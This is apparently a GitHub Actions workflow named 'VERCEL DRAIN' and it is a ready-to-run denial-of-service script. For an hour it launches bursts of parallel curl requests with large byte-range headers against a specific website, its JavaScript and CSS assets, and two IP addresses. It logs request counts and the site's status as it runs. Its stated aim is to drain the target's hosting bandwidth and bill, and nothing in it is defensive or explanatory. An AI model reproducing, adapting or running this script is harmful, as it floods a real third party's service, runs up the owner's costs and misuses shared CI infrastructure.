name: 💀 VERCEL DRAIN - HTTPS DIRECT

on:
  workflow_dispatch:

jobs:
  drain:
    runs-on: ubuntu-latest
    timeout-minutes: 65
    
    steps:
      - name: Install curl
        run: sudo apt update && sudo apt install -y curl
        
      - name: 🔥 DIRECT HTTPS DRAIN
        run: |
          echo "💀 DIRECT HTTPS DRAIN - BYPASS REDIRECTS 💀"
          echo ""
          
          END=$((SECONDS + 3600))
          TOTAL=0
          
          # أهداف HTTPS مباشرة
          TARGETS=(
            "https://flixtn.com/"
            "https://flixtn.com/assets/index-DiQY9GeF.css"
            "https://flixtn.com/assets/index-CllXAbrg.js"
            "https://flixtn.com/assets/prod-Bk_YgDXS.js"
            "https://flixtn.com/assets/prod-QfiXFxxq.js"
            "https://flixtn.com/assets/enhancements.js"
            "https://flixtn.com/assets/seasons.js"
            "https://flixtn.com/assets/admin-panel.js"
            "https://64.29.17.65/"
            "https://216.198.79.65/"
          )
          
          while [ $SECONDS -lt $END ]; do
            for target in "${TARGETS[@]}"; do
              for i in {1..20}; do
                # منع الـ redirect
                curl -s -o /dev/null "$target" \
                  -H "Range: bytes=0-500000" \
                  -L \
                  --max-time 3 \
                  2>/dev/null &
              done
            done
            
            TOTAL=$((TOTAL + 200))
            
            if [ $((SECONDS % 30)) -eq 0 ]; then
              ELAPSED=$((SECONDS / 60))
              STATUS=$(curl -s -o /dev/null -w "%{http_code}" -L "https://flixtn.com/" 2>/dev/null)
              echo "[$ELAPSED min] 🔥 $TOTAL req | 📊 Status: $STATUS"
            fi
            
            sleep 0.2
          done
